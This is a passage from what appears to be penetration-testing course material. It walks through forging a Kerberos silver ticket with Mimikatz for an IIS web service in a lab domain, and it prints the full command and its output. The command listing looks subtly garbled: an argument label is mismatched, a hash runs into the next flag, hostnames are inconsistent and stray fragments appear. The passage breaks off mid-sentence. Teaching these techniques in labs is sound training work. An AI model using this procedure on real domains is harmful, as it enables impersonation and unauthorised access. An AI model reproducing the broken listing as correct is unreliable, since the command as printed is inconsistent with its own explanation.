# OffSec

User SID

corp|jeff S-1-5-21-1987370270-658905905-1781884369-1105

Listing 817 - Obtaining the domain SID

The highlighted section in listing 817 shows the domain SID.

The last item is the target SPN. For this example, we will target the HTTP SPN resource on WEB04 (HTTP://web4.corp.com:80) because we want to access the web page running IIS.

Now that we have collected all pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the kerberos:golden module. This module provides the capabilities for creating golden and silver tickets. We'll explore the concept of golden tickets in the Module Lateral Movement in Active Directory.

We need to provide the domain SID (/sid), domain name (/domain), and the target where the SPN runs (/target). We also need to include the SPN protocol (/service), NTLM hash of the SPN (/rc4), and the /pt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

Finally, we must choose an existing domain user for user. This user will be in the forged ticket. For example, we use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves.

The complete command can be found in the following listing:

```
mimikatz # kerberos:golden /sid:S-1-5-21-1987370270-658905905-1781884369
/domain:corp.com /pt:web04.corp.com /service:http
/rc4:a2dc8c5f52d339971419580a51484ca09/user:jeffadmin
User: jeffadmin
Domain: corp.com (CORP)
SID: S-1-5-21-1987370270-658905905-1781884369
User Id: 500
Groups: *513 520 518 519
ServiceKey: a2dc8c5f52d339971419580a51484ca09 /rc4_hmac_nt
Service: http
Target: web4.corp.com
Lifetime: 9/14/2022 4:37:32 AM / 11/02/2032 4:37:32 AM / 11/02/2032 4:37:32 AM
-> Ticket: ** Pass The Ticket **
```

+   * PAC generated
* PAC signed
* EnctTicketPart generated
* EnctTicketPart encrypted
* Kred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

```
mimikatz # exit
```

Bye!

Listing 818: Forging the service ticket with the user jeffadmin and injecting it into the current session

As shown in Listing 818, a new ticket for the SPN HTTP/web4.corp.com has been loaded into memory and Mimikatz set attribute group membership permissions in the forged ticket. From the perspective of the attack, current user will be both the local